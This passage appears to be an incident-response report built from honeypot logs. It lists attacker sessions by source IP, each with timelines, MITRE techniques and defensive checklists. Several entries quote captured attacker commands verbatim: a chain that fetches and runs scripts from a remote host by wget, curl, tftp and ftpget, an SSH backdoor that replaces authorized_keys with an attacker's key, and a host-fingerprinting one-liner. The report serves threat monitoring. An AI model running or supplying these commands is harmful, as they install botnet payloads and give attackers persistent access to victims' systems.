- [ ] Submit `159.65.5[.]51` to AbuseIPDB if not already reported
- [ ] Block `159.65.5[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-133065f53bba

| Field | Detail |
|---|---|
| **Source IP** | `159.65.5[.]51` |
| **First Seen** | 2026-09-29 07:02 |
| **Last Seen** | 2026-09-29 07:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 07:02:02` | `cowrie.session.connect` |
| `2026-09-29 07:02:02` | `cowrie.client.version` |
| `2026-09-29 07:02:03` | `cowrie.client.kex` |
| `2026-09-29 07:02:04` | `cowrie.login.success` |
| `2026-09-29 07:02:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.65.5[.]51` to AbuseIPDB if not already reported
- [ ] Block `159.65.5[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5deb91bda47

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-29 07:27 |
| **Last Seen** | 2026-09-29 07:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 07:27:35` | `cowrie.session.connect` |
| `2026-09-29 07:27:35` | `cowrie.client.version` |
| `2026-09-29 07:27:36` | `cowrie.client.kex` |
| `2026-09-29 07:27:36` | `cowrie.login.success` |
| `2026-09-29 07:27:36` | `cowrie.direct-tcpip.request` |
| `2026-09-29 07:27:36` | `cowrie.direct-tcpip.data` |
| `2026-09-29 07:27:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bea70b580b07

| Field | Detail |
|---|---|
| **Source IP** | `106.12.179[.]53` |
| **First Seen** | 2026-09-29 07:55 |
| **Last Seen** | 2026-09-29 08:00 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 07:55:29` | `cowrie.session.connect` |
| `2026-09-29 07:55:29` | `cowrie.client.version` |
| `2026-09-29 07:55:29` | `cowrie.client.kex` |
| `2026-09-29 07:55:30` | `cowrie.login.success` |
| `2026-09-29 08:00:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.12.179[.]53` to AbuseIPDB if not already reported
- [ ] Block `106.12.179[.]53` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59d57ae9c928

| Field | Detail |
|---|---|
| **Source IP** | `58.221.60[.]25` |
| **First Seen** | 2026-09-29 08:02 |
| **Last Seen** | 2026-09-29 08:07 |
| **Session Duration** | 293s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 08:02:55` | `cowrie.session.connect` |
| `2026-09-29 08:02:55` | `cowrie.client.version` |
| `2026-09-29 08:02:55` | `cowrie.client.kex` |
| `2026-09-29 08:02:56` | `cowrie.login.success` |
| `2026-09-29 08:02:58` | `cowrie.session.params` |
| `2026-09-29 08:02:58` | `cowrie.command.input` |
| `2026-09-29 08:02:58` | `cowrie.command.failed` |
| `2026-09-29 08:02:59` | `cowrie.log.closed` |
| `2026-09-29 08:07:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.221.60[.]25` to AbuseIPDB if not already reported
- [ ] Block `58.221.60[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1acf026763a7

| Field | Detail |
|---|---|
| **Source IP** | `50.84.211[.]204` |
| **First Seen** | 2026-09-29 08:09 |
| **Last Seen** | 2026-09-29 08:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 08:09:12` | `cowrie.session.connect` |
| `2026-09-29 08:09:12` | `cowrie.client.version` |
| `2026-09-29 08:09:12` | `cowrie.client.kex` |
| `2026-09-29 08:09:13` | `cowrie.login.success` |
| `2026-09-29 08:09:14` | `cowrie.session.params` |
| `2026-09-29 08:09:14` | `cowrie.command.input` |
| `2026-09-29 08:09:14` | `cowrie.command.failed` |
| `2026-09-29 08:09:14` | `cowrie.log.closed` |
| `2026-09-29 08:09:14` | `cowrie.session.params` |
| `2026-09-29 08:09:14` | `cowrie.command.input` |
| `2026-09-29 08:09:14` | `cowrie.session.file_download` |
| `2026-09-29 08:09:14` | `cowrie.log.closed` |
| `2026-09-29 08:09:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.84.211[.]204` to AbuseIPDB if not already reported
- [ ] Block `50.84.211[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-326208780855

| Field | Detail |
|---|---|
| **Source IP** | `50.84.211[.]204` |
| **First Seen** | 2026-09-29 08:09 |
| **Last Seen** | 2026-09-29 08:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 08:09:15` | `cowrie.session.connect` |
| `2026-09-29 08:09:15` | `cowrie.client.version` |
| `2026-09-29 08:09:15` | `cowrie.client.kex` |
| `2026-09-29 08:09:15` | `cowrie.login.success` |
| `2026-09-29 08:09:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.84.211[.]204` to AbuseIPDB if not already reported
- [ ] Block `50.84.211[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

```
⚠️  MALWARE ANALYSIS — HIGH SEVERITY SAMPLE DETECTED
   File  : 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656  (ELF Binary (Linux executable))
   SHA256: 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aa...
   Score : 86/100  |  VT: 40/75
   ↳ Download via wget: wget
   ↳ Download via curl: curl
   ↳ Execution from /tmp: /tmp/bot
   ↳ chmod +x (make executable): chmod +x
```

### 🔴 HIGH · IR-55341f5014e0

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-09-29 08:13 |
| **Last Seen** | 2026-09-29 08:13 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh;curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh;busybox wget hxxp://213.232.114[.]14/handshakebins.sh;chmod 777 handshakebins.sh;sh handshakebins.sh;tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh;sh tftp1.sh;tftp -r tftp2.sh -g 213.232.114[.]14;chmod 777 tftp2.sh;sh tftp2.sh;ftpget -v -u anonymous -p anonymous -P 21 213.232.114[.]14 ftp1.sh ftp1.sh;sh ftp1.sh;rm -rf handshakebins.sh tftp1.sh` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **Malware Analysis** | 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656 (HIGH) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 08:13:40` | `cowrie.session.connect` |
| `2026-09-29 08:13:40` | `cowrie.client.version` |
| `2026-09-29 08:13:40` | `cowrie.client.kex` |
| `2026-09-29 08:13:41` | `cowrie.login.success` |
| `2026-09-29 08:13:41` | `cowrie.session.params` |
| `2026-09-29 08:13:41` | `cowrie.command.input` |
| `2026-09-29 08:13:42` | `cowrie.session.file_download` |
| `2026-09-29 08:13:42` | `cowrie.session.file_download` |
| `2026-09-29 08:13:42` | `cowrie.session.file_download` |
| `2026-09-29 08:13:43` | `cowrie.session.file_download` |
| `2026-09-29 08:13:43` | `cowrie.session.file_download.failed` |
| `2026-09-29 08:13:43` | `cowrie.session.file_download` |
| `2026-09-29 08:13:44` | `cowrie.session.file_download` |
| `2026-09-29 08:13:52` | `cowrie.log.closed` |
| `2026-09-29 08:13:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Review VT report: hxxps://www.virustotal.com/gui/file/07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f41b67370060

| Field | Detail |
|---|---|
| **Source IP** | `168.76.131[.]178` |
| **First Seen** | 2026-09-29 08:14 |
| **Last Seen** | 2026-09-29 08:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 08:14:12` | `cowrie.session.connect` |
| `2026-09-29 08:14:12` | `cowrie.client.version` |
| `2026-09-29 08:14:12` | `cowrie.client.kex` |
| `2026-09-29 08:14:13` | `cowrie.login.success` |
| `2026-09-29 08:14:14` | `cowrie.session.params` |
| `2026-09-29 08:14:14` | `cowrie.command.input` |
| `2026-09-29 08:14:14` | `cowrie.command.failed` |
| `2026-09-29 08:14:15` | `cowrie.log.closed` |
| `2026-09-29 08:14:15` | `cowrie.session.params` |
| `2026-09-29 08:14:15` | `cowrie.command.input` |
| `2026-09-29 08:14:16` | `cowrie.session.file_download` |
| `2026-09-29 08:14:16` | `cowrie.log.closed` |
| `2026-09-29 08:14:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.76.131[.]178` to AbuseIPDB if not already reported
- [ ] Block `168.76.131[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a15ff1b7eae

| Field | Detail |
|---|---|
| **Source IP** | `168.76.131[.]178` |
| **First Seen** | 2026-09-29 08:14 |
| **Last Seen** | 2026-09-29 08:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 08:14:16` | `cowrie.session.connect` |
| `2026-09-29 08:14:16` | `cowrie.client.version` |
| `2026-09-29 08:14:16` | `cowrie.client.kex` |
| `2026-09-29 08:14:17` | `cowrie.login.success` |
| `2026-09-29 08:14:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.76.131[.]178` to AbuseIPDB if not already reported
- [ ] Block `168.76.131[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d5f2d91da9d

| Field | Detail |
|---|---|
| **Source IP** | `118.196.74[.]97` |
| **First Seen** | 2026-09-29 08:15 |
| **Last Seen** | 2026-09-29 08:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 08:15:51` | `cowrie.session.connect` |
| `2026-09-29 08:15:51` | `cowrie.client.version` |
| `2026-09-29 08:15:51` | `cowrie.client.kex` |
| `2026-09-29 08:15:53` | `cowrie.login.success` |
| `2026-09-29 08:15:54` | `cowrie.session.params` |
| `2026-09-29 08:15:54` | `cowrie.command.input` |
| `2026-09-29 08:15:54` | `cowrie.command.failed` |
| `2026-09-29 08:15:55` | `cowrie.log.closed` |
| `2026-09-29 08:15:55` | `cowrie.session.params` |
| `2026-09-29 08:15:55` | `cowrie.command.input` |
| `2026-09-29 08:15:56` | `cowrie.session.file_download` |
| `2026-09-29 08:15:56` | `cowrie.log.closed` |
| `2026-09-29 08:15:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.196.74[.]97` to AbuseIPDB if not already reported
- [ ] Block `118.196.74[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d6984b30f54

| Field | Detail |
|---|---|
| **Source IP** | `118.196.74[.]97` |
| **First Seen** | 2026-09-29 08:15 |
| **Last Seen** | 2026-09-29 08:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 08:15:56` | `cowrie.session.connect` |
| `2026-09-29 08:15:56` | `cowrie.client.version` |
| `2026-09-29 08:15:56` | `cowrie.client.kex` |
| `2026-09-29 08:15:57` | `cowrie.login.success` |
| `2026-09-29 08:15:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.196.74[.]97` to AbuseIPDB if not already reported
- [ ] Block `118.196.74[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37a7c20c8fde

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-09-29 08:16 |
| **Last Seen** | 2026-09-29 08:16 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh;curl -o handshakebins.sh hxxp://213.232.114[.]14/nokillbins/handshakebins.sh;busybox wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh;chmod 777 handshakebins.sh;sh handshakebins.sh;tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh;sh tftp1.sh;tftp -r tftp2.sh -g 213.232.114[.]14;chmod 777 tftp2.sh;sh tftp2.sh;ftpget -v -u anonymous -p anonymous -P 21 213.232.114[.]14 ftp1.sh ftp1.sh;sh ftp1.sh` |
| **Download Attempts** | hxxp://213.232.114[.]14/nokillbins/handshakebins.sh, hxxp://213.232.114[.]14/nokillbins/handshakebins.sh, hxxp://213.232.114[.]14/nokillbins/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 08:16:10` | `cowrie.session.connect` |
| `2026-09-29 08:16:10` | `cowrie.client.version` |
| `2026-09-29 08:16:10` | `cowrie.client.kex` |
| `2026-09-29 08:16:11` | `cowrie.login.success` |
| `2026-09-29 08:16:11` | `cowrie.session.params` |
| `2026-09-29 08:16:11` | `cowrie.command.input` |
| `2026-09-29 08:16:12` | `cowrie.session.file_download` |
| `2026-09-29 08:16:13` | `cowrie.session.file_download` |
| `2026-09-29 08:16:13` | `cowrie.session.file_download` |
| `2026-09-29 08:16:13` | `cowrie.session.file_download` |
| `2026-09-29 08:16:13` | `cowrie.session.file_download.failed` |
| `2026-09-29 08:16:14` | `cowrie.session.file_download` |
| `2026-09-29 08:16:14` | `cowrie.session.file_download` |
| `2026-09-29 08:16:22` | `cowrie.log.closed` |
| `2026-09-29 08:16:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2545deed45dc

| Field | Detail |
|---|---|
| **Source IP** | `14.36.171[.]104` |
| **First Seen** | 2026-09-29 08:17 |
| **Last Seen** | 2026-09-29 08:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 08:17:52` | `cowrie.session.connect` |
| `2026-09-29 08:17:52` | `cowrie.client.version` |
| `2026-09-29 08:17:52` | `cowrie.client.kex` |
| `2026-09-29 08:17:53` | `cowrie.login.success` |
| `2026-09-29 08:17:54` | `cowrie.session.params` |
| `2026-09-29 08:17:54` | `cowrie.command.input` |
| `2026-09-29 08:17:54` | `cowrie.command.failed` |
| `2026-09-29 08:17:54` | `cowrie.log.closed` |
| `2026-09-29 08:17:55` | `cowrie.session.params` |
| `2026-09-29 08:17:55` | `cowrie.command.input` |
| `2026-09-29 08:17:55` | `cowrie.session.file_download` |
| `2026-09-29 08:17:55` | `cowrie.log.closed` |
| `2026-09-29 08:17:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.36.171[.]104` to AbuseIPDB if not already reported
- [ ] Block `14.36.171[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd0dced76b88

| Field | Detail |
|---|---|
| **Source IP** | `14.36.171[.]104` |
| **First Seen** | 2026-09-29 08:17 |
| **Last Seen** | 2026-09-29 08:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 08:17:55` | `cowrie.session.connect` |
| `2026-09-29 08:17:55` | `cowrie.client.version` |
| `2026-09-29 08:17:56` | `cowrie.client.kex` |
| `2026-09-29 08:17:56` | `cowrie.login.success` |
| `2026-09-29 08:17:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.36.171[.]104` to AbuseIPDB if not already reported
- [ ] Block `14.36.171[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ecff3b11011

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-29 08:18 |
| **Last Seen** | 2026-09-29 08:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 08:18:47` | `cowrie.session.connect` |
| `2026-09-29 08:18:47` | `cowrie.client.version` |
| `2026-09-29 08:18:48` | `cowrie.client.kex` |
| `2026-09-29 08:18:48` | `cowrie.login.success` |
| `2026-09-29 08:18:48` | `cowrie.direct-tcpip.request` |
| `2026-09-29 08:18:48` | `cowrie.direct-tcpip.data` |
| `2026-09-29 08:18:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f902fbaa668e

| Field | Detail |
|---|---|
| **Source IP** | `58.221.60[.]25` |
| **First Seen** | 2026-09-29 08:27 |
| **Last Seen** | 2026-09-29 08:27 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 08:27:15` | `cowrie.session.connect` |
| `2026-09-29 08:27:15` | `cowrie.client.version` |
| `2026-09-29 08:27:16` | `cowrie.client.kex` |
| `2026-09-29 08:27:28` | `cowrie.login.success` |
| `2026-09-29 08:27:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.221.60[.]25` to AbuseIPDB if not already reported
- [ ] Block `58.221.60[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ce2b483ee98

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]204` |
| **First Seen** | 2026-09-29 08:49 |
| **Last Seen** | 2026-09-29 08:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 08:49:50` | `cowrie.session.connect` |
| `2026-09-29 08:49:50` | `cowrie.telnet.option` |
| `2026-09-29 08:49:50` | `cowrie.telnet.option` |
| `2026-09-29 08:50:21` | `cowrie.login.success` |
| `2026-09-29 08:50:22` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]204` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d146700580ef

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-29 09:08 |
| **Last Seen** | 2026-09-29 09:09 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 09:08:46` | `cowrie.session.connect` |
| `2026-09-29 09:08:47` | `cowrie.client.version` |
| `2026-09-29 09:08:47` | `cowrie.client.kex` |
| `2026-09-29 09:08:49` | `cowrie.login.success` |
| `2026-09-29 09:08:52` | `cowrie.session.params` |
| `2026-09-29 09:08:52` | `cowrie.command.input` |
| `2026-09-29 09:08:52` | `cowrie.command.input` |
| `2026-09-29 09:08:52` | `cowrie.command.input` |
| `2026-09-29 09:08:52` | `cowrie.command.input` |
| `2026-09-29 09:08:52` | `cowrie.command.input` |
| `2026-09-29 09:08:52` | `cowrie.command.success` |
| `2026-09-29 09:08:52` | `cowrie.command.input` |
| `2026-09-29 09:08:52` | `cowrie.command.input` |
| `2026-09-29 09:08:52` | `cowrie.command.input` |
| `2026-09-29 09:08:52` | `cowrie.command.input` |
| `2026-09-29 09:08:53` | `cowrie.log.closed` |
| `2026-09-29 09:08:58` | `cowrie.session.params` |
| `2026-09-29 09:08:58` | `cowrie.command.input` |
| `2026-09-29 09:08:59` | `cowrie.log.closed` |
| `2026-09-29 09:09:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

